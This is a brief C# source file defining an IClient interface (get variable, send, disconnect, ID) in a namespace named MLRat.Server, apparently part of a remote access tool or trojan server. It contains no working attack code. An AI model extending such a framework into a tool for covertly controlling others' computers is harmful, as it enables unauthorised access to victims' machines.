using System;

namespace MLRat.Server
{
    public interface IClient
    {
        T GetVariable<T>(string name, T DefaultValue);
        void Send(params object[] data);
        Guid ID {get; }
        void Disconnect();
    }
}
